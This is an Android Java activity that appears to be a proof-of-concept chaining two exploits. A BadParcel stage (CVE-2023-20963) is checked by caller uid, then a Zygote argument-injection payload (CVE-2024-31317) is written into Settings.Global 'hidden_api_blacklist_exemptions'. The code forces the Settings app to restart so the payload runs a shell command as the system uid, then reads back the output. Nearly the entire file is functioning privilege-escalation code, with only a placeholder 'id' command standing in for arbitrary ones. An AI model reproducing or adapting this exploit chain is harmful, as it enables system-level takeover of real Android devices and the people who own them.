package com.example.tzpoc;

import android.app.Activity;
import android.os.Binder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Process;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class ProofActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int callerUid = Binder.getCallingUid();
        int myUid = Process.myUid();

        String msg = "[ProofActivity] called. callerUid=" + callerUid + ", myUid=" + myUid;
        Log.i("BadParcel", msg);
        MainActivity.appendLog(msg);

        // 証跡ファイル
        createProofFile(callerUid, myUid);

        if (callerUid == 1000) {
            MainActivity.appendLog("[!!!] BadParcel SUCCESS: Called by system (uid=1000)");

            // ステージ2: CVE-2024-31317 インジェクション
            MainActivity.appendLog("[*] Stage 2: Injecting Zygote payload via Settings.Global...");
            boolean injected = injectZygotePayload();
            if (injected) {
                MainActivity.appendLog("[+] Zygote payload injected successfully.");
                // ステージ3: Zygote 再起動トリガー
                MainActivity.appendLog("[*] Stage 3: Triggering Zygote reload...");
                triggerZygoteReload();
            } else {
                MainActivity.appendLog("[-] Zygote injection failed.");
            }
        } else {
            MainActivity.appendLog("[!] Called by non-system uid: " + callerUid);
            MainActivity.appendLog("[!] Skipping CVE-2024-31317 because caller is not system.");
        }

        finish();
    }

    private void createProofFile(int callerUid, int myUid) {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists()) dir.mkdirs();
            File proof = new File(dir, "two_stage_proof.txt");
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                pw.println("=== Two-Stage Exploit Proof ===");
                pw.println("Timestamp: " + new java.util.Date());
                pw.println("Caller UID: " + callerUid);
                pw.println("My UID: " + myUid);
                pw.println("BadParcel (CVE-2023-20963): " + (callerUid == 1000 ? "SUCCESS" : "FAILED"));
                pw.println("CVE-2024-31317: " + (callerUid == 1000 ? "ATTEMPTED" : "SKIPPED"));
            }
            MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to create proof: " + e.getMessage());
        }
    }

    /**
     * CVE-2024-31317 正規ペイロードを Settings.Global に書き込む
     * 戻り値: 書き込み成功時 true
     */
    private boolean injectZygotePayload() {
        try {
            // 現在の値を保存（復元用）
            String current = Settings.Global.getString(getContentResolver(),
                    "hidden_api_blacklist_exemptions");
            MainActivity.appendLog("[+] Current hidden_api_blacklist_exemptions: " + current);

            String command = "id > /data/local/tmp/zygote_id.txt";
            String payload = "L*\n" +
                    "--runtime-args\n" +
                    "--setuid=1000\n" +
                    "--setgid=1000\n" +
                    "--invoke-with\n" +
                    "/system/bin/sh -c '" + command + "'\n" +
                    "--package-name=com.android.settings\n" +
                    "android.app.ActivityThread";

            // 注意: Android 9 では --target-sdk-version や --nice-name も指定可能だが、最小限で動作する

            MainActivity.appendLog("[+] Payload (escaped): " + payload.replace("\n", "\\n"));

            // 書き込み
            boolean result = Settings.Global.putString(getContentResolver(),
                    "hidden_api_blacklist_exemptions", payload);
            MainActivity.appendLog("[+] Settings.Global.putString result: " + result);

            // 検証
            String verify = Settings.Global.getString(getContentResolver(),
                    "hidden_api_blacklist_exemptions");
            MainActivity.appendLog("[+] Verified: " + (verify != null ? verify.replace("\n", "\\n") : "null"));

            return result;
        } catch (Exception e) {
            MainActivity.appendLog("[-] Injection failed: " + e.getMessage());
            return false;
        }
    }

    /**
     * Zygote に新しい設定を読ませるため、Settings アプリを強制停止→再起動
     * これにより Zygote が新しいプロセスを孵化し、ペイロードが実行される
     */
    private void triggerZygoteReload() {
        MainActivity.appendLog("[*] Forcing Zygote to reload by restarting Settings app...");

        try {
            // 強制停止
            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c", "am force-stop com.android.settings"
            });
            int exitCode = process.waitFor();
            MainActivity.appendLog("[+] force-stop exit code: " + exitCode);
        } catch (Exception e) {
            MainActivity.appendLog("[-] force-stop failed: " + e.getMessage());
        }

        // 少し待つ
        try {
            Thread.sleep(1000);
        } catch (InterruptedException ignored) {}

        try {
            // 再起動（これにより Zygote が Settings の新しいプロセスを孵化）
            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c", "am start -n com.android.settings/.Settings"
            });
            int exitCode = process.waitFor();
            MainActivity.appendLog("[+] start Settings exit code: " + exitCode);
        } catch (Exception e) {
            MainActivity.appendLog("[-] start Settings failed: " + e.getMessage());
        }

        // さらに待ってから結果を確認
        try {
            Thread.sleep(3000);
        } catch (InterruptedException ignored) {}

        // 実行結果を読み取る
        MainActivity.appendLog("[*] Checking /data/local/tmp/zygote_id.txt ...");
        try {
            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c", "cat /data/local/tmp/zygote_id.txt 2>/dev/null || echo 'File not found'"
            });
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            String content = output.toString().trim();
            MainActivity.appendLog("[+] Content of zygote_id.txt:\n" + content);
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to read zygote_id.txt: " + e.getMessage());
        }
    }
}
